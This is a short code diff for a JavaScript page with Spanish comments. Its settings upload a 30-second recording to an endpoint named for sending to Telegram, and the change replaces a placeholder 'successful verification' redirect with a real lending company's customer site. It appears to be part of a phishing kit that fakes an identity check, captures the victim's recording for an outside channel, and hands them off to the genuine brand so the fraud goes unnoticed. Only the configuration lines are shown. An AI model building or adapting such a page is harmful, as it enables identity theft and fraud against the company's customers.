@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
     // --- Configuración ---
     const UPLOAD_URL = "/api/enviar-a-telegram";
-    const SUCCESS_REDIRECT_URL = "https://tu-web.com/verificacion-exitosa.html";
+    const SUCCESS_REDIRECT_URL = "https://clientes.addi.com";
     const RECORDING_SECONDS = 30;
 
     // Ajuste vh para móviles (solución al bug de 100vh)
